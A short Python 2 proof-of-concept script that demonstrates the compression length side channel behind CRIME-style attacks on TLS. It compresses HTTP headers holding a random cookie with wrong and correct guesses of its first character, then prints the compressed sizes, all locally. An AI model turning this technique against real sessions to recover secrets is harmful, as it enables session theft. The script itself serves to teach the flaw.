import zlib
import random
import string

charset = string.letters + string.digits

COOKIE = ''.join(random.choice(charset) for x in range(30))

HEADERS = ("POST / HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/5.37. (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
            "Cookie: secret=" + COOKIE + "\r\n"
            "\r\n"
)

def compress(data):
    c = zlib.compressobj()
    compressed_data = c.compress(data) + c.flush(zlib.Z_SYNC_FLUSH)
    return compressed_data

def display_compressed_data_info(secret):
    global HEADERS
    body = HEADERS + "Cookie: secret=" + secret + "\r\n"
    print(body)
    print("*** Original Data Length : \t" + str(len(body)))
    print("*** Compressed Data Length : \t" + str(len(compress(body))))
    print("")

print("========================================================= TLS COMPRESSION IS VULNERABLE (PoC) ========================================================")
print("")

print("INFO: Cookie value \t" + COOKIE)
print("")

print("INFO: Compressing with wrong secret value")
print("")
wrong_secret = random.choice(charset.replace(COOKIE[0],''))
display_compressed_data_info(wrong_secret)

print("INFO: Compression with correct secret value")
print("")
correct_secret = COOKIE[0]
display_compressed_data_info(correct_secret)

print("======================================================================================================================================================")
